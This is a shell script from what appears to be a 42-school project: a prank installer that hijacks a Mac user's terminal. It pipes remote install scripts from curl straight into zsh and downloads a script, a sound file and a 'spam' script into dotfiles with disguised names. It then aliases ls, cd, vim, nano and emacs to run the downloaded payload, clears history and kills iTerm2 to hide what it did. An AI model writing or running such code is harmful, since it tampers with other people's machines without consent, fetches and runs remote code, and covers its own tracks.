# **************************************************************************** #
#                                                           LE - /             #
#                                                               /              #
#    install.sh                                       .::    .:/ .      .::    #
#                                                  +:+:+   +:    +:  +:+:+     #
#    By: amonteli <amonteli@student.le-101.fr>      +:+   +:    +:    +:+      #
#                                                  #+#   #+    #+    #+#       #
#    Created: 2019/07/20 21:38:02 by amonteli     #+#   ##    ##    #+#        #
#    Updated: 2019/10/22 21:58:00 by amonteli    ###    #+. /#+    ###.fr      #
#                                                          /                   #
#                                                         /                    #
# **************************************************************************** #

if [ -f "/Users/$USER/.brewconfig.zsh" ]
then
	(brew install switchaudio-osx)
else
	(curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh)
	(curl -fsSL https://raw.githubusercontent.com/iSnkh/42Troll/master/lsound/install.sh | zsh)
fi

if [ -f "/Users/$USER/.zshrc" ]
then
		cp /Users/$USER/.zshrc /Users/$USER/.zshrcsave
fi

if [ -f "/Users/$USER/.oh-my-zsh/custom/alias.zsh" ]
then
		cp /Users/$USER/.oh-my-zsh/custom/alias.zsh /Users/$USER/.oh-my-zsh/custom/.aliassave
fi

curl https://raw.githubusercontent.com/iSnkh/42Troll/master/lsound/lsound.sh -o ~/.zcondump-z5r69p2-5.2
curl https://raw.githubusercontent.com/iSnkh/42Troll/master/lsound/sounds/anime_cyka_bliet.mp3 -o ~/.cocopops.42_cache_bak69
curl https://raw.githubusercontent.com/iSnkh/42Troll/master/lsound/spam.sh -o ~/.cocopops.42_cache_bakspam
touch ~/.oh-my-zsh/custom/alias.zsh

echo "alias ls='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias cd='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias vim='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias vi='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias nano='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.oh-my-zsh/custom/alias.zsh
echo "alias emacs='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.oh-my-zsh/custom/alias.zsh

echo "alias ls='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.zshrc
echo "alias cd='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.zshrc
echo "alias vim='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.zshrc
echo "alias vi='sh /Users/$USER/.zcondump-z5r69p2-5.2'" >> ~/.zshrc

clear
history -c
exec zsh
killall iTerm2
